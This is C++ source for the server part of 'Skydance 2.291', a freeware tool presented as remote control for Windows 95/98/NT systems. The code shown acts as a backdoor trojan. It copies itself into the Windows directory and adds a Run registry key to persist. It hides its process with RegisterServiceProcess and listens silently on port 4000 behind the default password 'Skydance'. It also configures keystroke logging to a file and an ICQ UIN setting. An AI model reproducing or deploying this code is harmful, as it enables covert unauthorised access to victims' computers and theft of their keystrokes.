/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkyServer.cpp : Legt das Klassenverhalten für die Anwendung fest.
//

#include "stdafx.h"
#include "SkyServer.h"
#include "SkyServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
typedef DWORD  (WINAPI * DLLPROC_RegisterServiceProcess)(DWORD, DWORD);
/////////////////////////////////////////////////////////////////////////////
// CSkyServerApp

BEGIN_MESSAGE_MAP(CSkyServerApp, CWinApp)
	//{{AFX_MSG_MAP(CSkyServerApp)
		// HINWEIS - Hier werden Mapping-Makros vom Klassen-Assistenten eingefügt und entfernt.
		//    Innerhalb dieser generierten Quelltextabschnitte NICHTS VERÄNDERN!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSkyServerApp Konstruktion

CSkyServerApp::CSkyServerApp()
{
	// ZU ERLEDIGEN: Hier Code zur Konstruktion einfügen
	// Alle wichtigen Initialisierungen in InitInstance platzieren
}

/////////////////////////////////////////////////////////////////////////////
// Das einzige CSkyServerApp-Objekt

CSkyServerApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CSkyServerApp Initialisierung

void __fastcall CSkyServerApp::RegisterProcess(BOOL bVisible)
{
	HMODULE hmod;
	DLLPROC_RegisterServiceProcess RegServProc;
	hmod = LoadLibrary("kernel32.dll");
	
	if (!hmod) return;
	
	RegServProc = (DLLPROC_RegisterServiceProcess) GetProcAddress(hmod,"RegisterServiceProcess");
//	RegServProc; FreeLibrary(hmod); return; //unnötige functions in der release... falsch!!!
	if (!RegServProc) {FreeLibrary(hmod); return;}
	else 
	{
		if (bVisible)
		{
			if (RegServProc(0,1) == 1);// AfxMessageBox("Hidden");
		}
		else 
		{
			if (RegServProc(0,0) == 1);// AfxMessageBox("Un-Hidden");
		}
	}
	FreeLibrary(hmod);
}

BOOL CSkyServerApp::InitInstance()
{
	if (!AfxSocketInit())
	{
//		AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
		return FALSE;
	}
	///////variablen
	
	m_iPort = 4000;	
	m_iEnableDlg = 0;
	m_sPass = "Skydance";
	m_sServerName = "unknown";
	//CString thisFile = argv[0];
	////Registry////
	UpDateRegistry();
	
	// Standardinitialisierung
	// Wenn Sie diese Funktionen nicht nutzen und die Größe Ihrer fertigen 
	//  ausführbaren Datei reduzieren wollen, sollten Sie die nachfolgenden
	//  spezifischen Initialisierungsroutinen, die Sie nicht benötigen, entfernen.

#ifdef _AFXDLL
	Enable3dControls();			// Diese Funktion bei Verwendung von MFC in gemeinsam genutzten DLLs aufrufen
#else
	Enable3dControlsStatic();	// Diese Funktion bei statischen MFC-Anbindungen aufrufen
#endif
	CSkyServerDlg dlg;
	m_pMainWnd = &dlg;
	dlg.m_iListenPort = m_iPort;
	dlg.m_sPass = m_sPass;
	
	if(m_sLogAlways == "1") dlg.bKeyLog = 1;
	else dlg.bKeyLog = 0;
	dlg.m_sLogAlways = m_sLogAlways;
	dlg.m_sDLLFile = m_sDLLFile;
	dlg.m_sLogFile = m_sLogFile;
	dlg.m_sUIN = m_sUIN;
	dlg.m_iEnableDlg = m_iEnableDlg;
	dlg.m_sServerName = m_sServerName;
	if( m_iEnableDlg == 0)
	{
		RegisterProcess(TRUE);		//Process versteckem
		dlg.InitMyLoop();
		MSG msg;
		while( GetMessage( &msg, NULL, 0, 0 ) )
		{
			TranslateMessage( &msg );
			DispatchMessage( &msg );
		}
	}
	else
	{
		int nResponse = dlg.DoModal();
		if (nResponse == IDOK)
		{
			// ZU ERLEDIGEN: Fügen Sie hier Code ein, um ein Schließen des
		//  Dialogfelds über OK zu steuern
		}
		else if (nResponse == IDCANCEL)
		{
			// ZU ERLEDIGEN: Fügen Sie hier Code ein, um ein Schließen des
			//  Dialogfelds über "Abbrechen" zu steuern
		}
	}

	// Da das Dialogfeld geschlossen wurde, FALSE zurückliefern, so dass wir die
	//  Anwendung verlassen, anstatt das Nachrichtensystem der Anwendung zu starten.
	return FALSE;
}


////Registry////
void CSkyServerApp::UpDateRegistry()
{
	extern char far *_pgmptr;
	m_sServerName = _pgmptr;
	DWORD size2 =20;
	char *PwinPath = new CHAR[size2];
	GetEnvironmentVariable("windir", PwinPath, size2);
	CString winPath(PwinPath);
	CString progPath;
	progPath = winPath + "\\Skd.exe";
	
	CString RunKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	CString IniKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion";

	CString sHKEY = "2";
	CString sTyp = "0";	// type - string, nicht DWORD

/*	if(GetRegistryVal( sHKEY , IniKeyName , "SkdDlg"))
	{
		sscanf (m_sGetRegistryVal, "%d", &m_iEnableDlg);
	
		if(GetRegistryVal( sHKEY , IniKeyName , "SkdPass")) m_sPass = m_sGetRegistryVal;
		else m_sPass = ryVal;		*/

	if(GetRegistryVal( sHKEY , IniKeyName , "SkdPass"))
	{
		m_sPass = m_sGetRegistryVal;

		if(GetRegistryVal( sHKEY , IniKeyName , "SkdDlg")) sscanf (m_sGetRegistryVal, "%d", &m_iEnableDlg);
		else
		{
			CopyFile( _pgmptr, progPath , FALSE);////er ÜBERSCHREIBT !
			SetRegistryVal( sHKEY , IniKeyName , "SkdDlg" , "0", sTyp);
			SetRegistryVal( sHKEY , RunKeyName , "Skd" , progPath, sTyp);	//wäre zwar anders schöner...
			m_iEnableDlg = 0;
		}
		
		if(GetRegistryVal( sHKEY , IniKeyName , "SkdPort")) sscanf (m_sGetRegistryVal, "%d", &m_iPort);
		else m_iPort = 4000;

		if(GetRegistryVal( sHKEY , IniKeyName , "SkdLog")) m_sLogFile = m_sGetRegistryVal;
		else m_sLogFile = "c:\\skdLogFile.txt";

		if(GetRegistryVal( sHKEY , IniKeyName , "SkdLA")) m_sLogAlways = m_sGetRegistryVal;
		else m_sLogAlways = "0";
		
		if(GetRegistryVal( sHKEY , IniKeyName , "SkdDLL")) m_sDLLFile = m_sGetRegistryVal;
		else m_sDLLFile = "skdl.dll";
		
		if(GetRegistryVal( sHKEY , IniKeyName , "SkdUIN")) m_sUIN = m_sGetRegistryVal;
		else m_sUIN = "";

	}
	else
	{
		CopyFile( _pgmptr, progPath , FALSE);////ÜBERSCHREIBEN!?
		SetRegistryVal( sHKEY , IniKeyName , "SkdPass" , "Skydance", sTyp);
		SetRegistryVal( sHKEY , IniKeyName , "SkdPort" , "4000", sTyp);
		SetRegistryVal( sHKEY , IniKeyName , "SkdDlg" , "0", sTyp);
		SetRegistryVal( sHKEY , RunKeyName , "Skd" , progPath, sTyp);
	}
	
	delete PwinPath;
}

